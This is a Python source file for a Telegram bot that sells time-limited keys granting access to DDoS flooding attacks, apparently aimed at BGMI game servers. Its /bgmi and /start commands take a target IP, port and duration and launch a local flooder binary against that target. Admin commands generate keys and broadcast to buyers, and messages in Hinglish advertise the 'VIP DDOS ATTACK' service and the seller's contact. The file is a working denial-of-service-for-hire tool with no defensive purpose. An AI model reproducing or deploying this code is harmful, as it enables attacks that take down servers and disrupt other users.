
import subprocess
import json
import os
import random
import string
import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, OWNER_ID


USER_FILE = "users.json"
KEY_FILE = "keys.json"

flooding_process = None
flooding_command = None


DEFAULT_THREADS = 50


users = {}
keys = {}


def load_data():
    global users, keys
    users = load_users()
    keys = load_keys()

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading keys: {e}")
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

# Command to generate keys
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"Key generated: {key}\nExpires on: {expiration_date}"
            except ValueError:
                response = "Please specify a valid number and unit of time (hours/days) script by @BGMISTORE95."
        else:
            response = "Usage: /genkey <30> <hours/days>"
    else:
        response = "ONLY OWNER CAN USE💀OWNER {@BGMISTORE95}..."

    await update.message.reply_text(response)





# COMMAND: /MY_STATUS
async def my_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)

    if user_id not in users:
        await update.message.reply_text(
            "❌AAPKE PAAS KOI ACTIVE KEY NAHI HAI!\n"
            "📌KEY REDEEM KARNE KE LIYE CONTACT OWNER: @BGMISTORE95\n"
            "📢CHANNEL JOIN KARO: @KGFDDOS\n"
            "📌COMMANDS DEKHNE KE LIYE /HELP TYPE KAREIN"
        )
        return

    expiration_str = users[user_id]  # YYYY-MM-DD HH:MM:SS
    expiration_dt = datetime.datetime.strptime(expiration_str, '%Y-%m-%d %H:%M:%S')
    now = datetime.datetime.now()
    remaining = expiration_dt - now

    if remaining.total_seconds() <= 0:
        await update.message.reply_text(
            "⚠️AAPKI KEY EXPIRED HO GAYI HAI!\n"
            "📌KEY REDEEM KARNE KE LIYE CONTACT OWNER: @BGMISTORE95\n"
            "📢CHANNEL JOIN KARO: @KGFDDOS\n"
            "📌COMMANDS DEKHNE KE LIYE /HELP TYPE KAREIN"
        )
        return

    days = remaining.days
    hours = remaining.seconds // 3600
    minutes = (remaining.seconds % 3600) // 60

    await update.message.reply_text(
        f"✅AAPKI KEY ABHI ACTIVE HAI!\n"
        f"⏰: {days} DAYS {hours} HOURS {minutes} MINUTES\n"
        f"👤OWNER: @BGMISTORE95\n"
        f"📢OFFICIAL CHANNEL: @KGFDDOS\n"
        f"📌COMMANDS DEKHNE KE LIYE /HELP TYPE KAREIN"
    )







async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        if key in keys:
            expiration_date_str = keys[key]  # string YYYY-MM-DD HH:MM:SS
            expiration_date = datetime.datetime.strptime(expiration_date_str, '%Y-%m-%d %H:%M:%S')

            # Agar user pehle se hai
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date_str

            save_users()
            del keys[key]
            save_keys()

            # Remaining days/hours calculation
            now = datetime.datetime.now()
            remaining = expiration_date - now
            days = remaining.days
            hours = remaining.seconds // 3600

            response = (
                f"✅KEY REDEEM SUCCESS!\n"
                f"⏰VALIDITY: {days} DAYS {hours} HOURS\n"
                f"📅EXPIRY DATE: {expiration_date_str}\n"
                f"👤OWNER: @BGMISTORE95\n"
                f"📢OFFICIAL CHANNEL: @KGFDDOS\n"
                f"📌COMMANDS DEKHNE KE LIYE /HELP TYPE KAREIN"
            )
        else:
            response = (
                f"❌INVALID YA EXPIRED KEY!\n"
                f"KEY KHARIDNE KE LIYE CONTACT OWNER: @BGMISTORE95\n"
                f"CHANNEL JOIN KARO: @KGFDDOS"
            )
    else:
        response = "Usage: /redeem <key>"

    await update.message.reply_text(response)
    








async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        if users:
            response = "Authorized Users:\n"
            for user_id, expiration_date in users.items():
                try:
                    user_info = await context.bot.get_chat(int(user_id))
                    username = user_info.username if user_info.username else f"UserID: {user_id}"
                    response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
                except Exception:
                    response += f"- User ID: {user_id} expires on {expiration_date}\n"
        else:
            response = "No data found"
    else:
        response = "ONLY OWNER CAN USE."
    await update.message.reply_text(response)


async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❤VIP DDOS ATTACk\n"
"⚠️AAPKE PAAS ACCESS NAHIN HAI!\n"
"1️⃣DM TO BUY @BGMISTORE95\n"
"2️⃣JOIN OFFICIAL CHANNEL: @KGFDDOS\n"
"📌HELP KE LIYE TYPE KAREIN: /HELP")
        return

    if len(context.args) != 3:
        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration>\n/start attack start\n/stop attack ')
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = context.args[2]

    flooding_command = ['./bgmi', target_ip, port, duration, str(DEFAULT_THREADS)]
    await update.message.reply_text('𝐁𝐆𝐌𝐈 𝐒𝐄𝐑𝐕𝐄𝐑 𝐌𝐀𝐍 𝐂𝐇𝐔𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 𝐎𝐍 𝐊𝐀𝐑 𝐃𝐎 /start')


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process, flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❤VIP DDOS ATTACk\n"
"⚠️AAPKE PAAS ACCESS NAHIN HAI!\n"
"1️⃣DM TO BUY @BGMISTORE95\n"
"2️⃣JOIN OFFICIAL CHANNEL: @KGFDDOS\n"
"📌HELP KE LIYE TYPE KAREIN: /HELP")
        return

    if flooding_process is not None:
        await update.message.reply_text('Flooding is already running.')
        return

    if flooding_command is None:
        await update.message.reply_text('No flooding parameters set. Use /bgmi to set parameters.')
        return

    flooding_process = subprocess.Popen(flooding_command)
    await update.message.reply_text('Started ATTACK.\n/stop attack')


async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❤VIP DDOS ATTACk\n"
"⚠️AAPKE PAAS ACCESS NAHIN HAI!\n"
"1️⃣DM TO BUY @BGMISTORE95\n"
"2️⃣JOIN OFFICIAL CHANNEL: @KGFDDOS\n"
"📌HELP KE LIYE TYPE KAREIN: /HELP")
        return

    if flooding_process is None:
        await update.message.reply_text('No flooding process is running.OWNER {@BGMISTORE95}...')
        return

    flooding_process.terminate()
    flooding_process = None
    await update.message.reply_text('Stopped attack\n/start')


async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        message = ' '.join(context.args)
        if not message:
            await update.message.reply_text('Usage: /broadcast <message>')
            return

        for user in users.keys():
            try:
                await context.bot.send_message(chat_id=int(user), text=message)
            except Exception as e:
                print(f"Error sending message to {user}: {e}")
        response = "Message sent to all users."
    else:
        response = "ONLY OWNER CAN USE."
    
    await update.message.reply_text(response)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    response = (
        "Welcome to the Flooding Bot by {@BGMISTORE95}:\n"
        "Admin Commands:\n"
        "/genkey <amount> <hours/days> .\n"
        "/allusers - Show all authorized users.\n"
        "/broadcast <message> - Broadcast .\n"
        "User Commands:\n"
        "/bgmi <target_ip> <port> <duration>.\n"
        "/start - Start the flooding process.\n"
        "/stop - Stop the flooding process.\n"
        "/my_status - CHECK KEY STATUS.\n"
        "/redeem <key> .\n"
    )
    await update.message.reply_text(response)

def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("allusers", allusers))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("my_status", my_status))
    
    
    


    load_data()
    application.run_polling()

if __name__ == '__main__':
    main()
#zaher_ddos
